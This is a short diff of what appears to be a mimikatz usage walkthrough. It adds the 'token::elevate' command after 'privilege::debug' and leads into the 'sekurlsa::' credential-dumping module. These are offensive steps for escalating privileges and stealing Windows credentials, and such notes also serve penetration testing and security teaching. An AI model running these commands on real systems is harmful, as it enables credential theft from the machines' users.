@@ -29,8 +29,9 @@
 # start mimikatz
 c:\Users\peterparker\Downloads>mimikatz.exe
 
-# start debug mode for full efficiency
+# Elevate to highest integrity level
 mimikatz # privilege::debug
+mimikatz # token::elevate
 
 # List available options
 mimikatz # sekurlsa::
